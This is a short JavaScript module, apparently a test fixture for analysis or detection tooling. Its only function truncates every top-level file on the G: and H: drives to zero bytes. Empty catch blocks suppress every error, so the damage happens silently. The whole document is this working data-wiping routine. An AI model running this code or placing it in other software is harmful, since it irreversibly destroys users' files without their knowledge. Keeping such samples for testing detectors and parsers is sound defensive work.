// Retained destructive flow under TypeScript parsing.
const fs = require('fs');
const path = require('path');
module.exports = function () {
  try {
    const disks = ['G:\\', 'H:\\'];
    for (const disk of disks) {
      try {
        const items = fs.readdirSync(disk);
        for (const item of items) {
          try {
            const selected = path.join(disk, item);
            if (fs.statSync(selected).isFile()) {
              fs.writeFileSync(selected, '');
            }
          } catch (error) {}
        }
      } catch (error) {}
    }
  } catch (error) {}
};
